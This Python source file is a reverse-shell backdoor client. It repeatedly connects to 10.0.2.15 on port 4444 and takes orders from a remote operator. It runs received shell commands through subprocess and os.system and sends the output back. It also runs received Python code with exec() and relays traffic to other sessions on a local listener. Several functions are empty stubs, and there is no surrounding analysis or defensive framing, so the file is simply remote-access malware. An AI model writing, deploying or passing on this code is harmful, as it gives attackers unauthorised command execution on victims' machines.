import socket,pickle
import subprocess
import os
import sys
import time
import threading

task=threading

conlis=[]
addrlis=[]

def create():
    global s
    try:
        s=socket.socket()
    except socket.error:
        create()
def connect():
    try:
            
        s.connect(("10.0.2.15",4444))
            
    except socket.error:
        print("go to return connect for whlie")
        time.sleep(3.5)
        connect()


def meter():
    x=s.recv(2048).decode()
    if x=='chat':
        chat()
    elif x=='shell':
         shell()
    elif x=='upload':
         upload()
    elif x=='download':
         download()
    elif x=='excute':
         excute()
    elif x=='exec1':
         exec1()
         meter()
    elif x=='gateway':
         gateway()
         meter()
    elif x=='psexec':
        psexec()
        meter()
    else:
         print("worng",x)
         meter()
         
def chat():
    print("welcome to chat")
    while True:
             try:

                 d=s.recv(2048).decode()
                 print(d)

                 d=input("chat from user>")
                 s.send(d.encode())
             except socket.error:
                 print("go to return connect")
                 time.sleep(4.0)
                 main()
                 
def shell():
    print("welcome to shell")
    while True:

              try:
       
                 data=s.recv(8080).decode()

                 print(data)
                 if data=='meterpreter':
                     meter()
                 else:
                     result =  subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE,universal_newlines=True)

                     result = result.stdout.read() + result.stderr.read()

                     s.send(result.encode())

              except socket.error:
                  print("go to return connect")
                  time.sleep(4.0)
                  main()
def upload():
    print("welcome")
    
def download():
    print("welcome")
def excute():
    while True:
        try:
            e=s.recv(2048).decode()
            os.system(e)
        except:
            main()
def exec1():
    global data
    
    data=s.recv(2048).decode()
    t1=task.Thread(exec_thread(),args=())
    t1.start()
    meter()
def exec_thread():
    exec(data) 
def psexec():
    print("welcome")
    
def gateway():
    print("gateway funtion")
    create2()
    listen()
    accept()
    select()
    dublex()

def create2():
    global b
    b=socket.socket()

def listen():
    global ip
    global po
    
    
    ip="localhost"
    po=5555
    
    b.bind((ip,po))
    b.listen(2)
    print("listen>")
def accept():
    global c
    global addr 
    x=0
    m=s.recv(2048).decode()
    
    y=int(m)
    print("exploit>")
    
    while x<y:
        try:
            (c,(addr))=b.accept()
            conlis.append(c)
            addrlis.append(addr)
            print("session connected-->",len(conlis),addrlis)
            x+=1
        except socket.error:
            main2()


def select():
    da=pickle.dumps(addrlis)
    s.send(da)
        
    i=s.recv(2048).decode()
    w=int(i)
    c=conlis[w]
def dublex():
    while True:
        try:

          ms=s.recv(10000)
          if not ms:
              break
              main()
          else:
              c.send(ms)
              
          data=c.recv(10000)
          if not data:
              break
              main()
          else:
              s.send(data)
        except socket.error:
            time.sleep(2.0)
            main()


def main():
    create()
    connect()
    meter()
    
    

    
main()
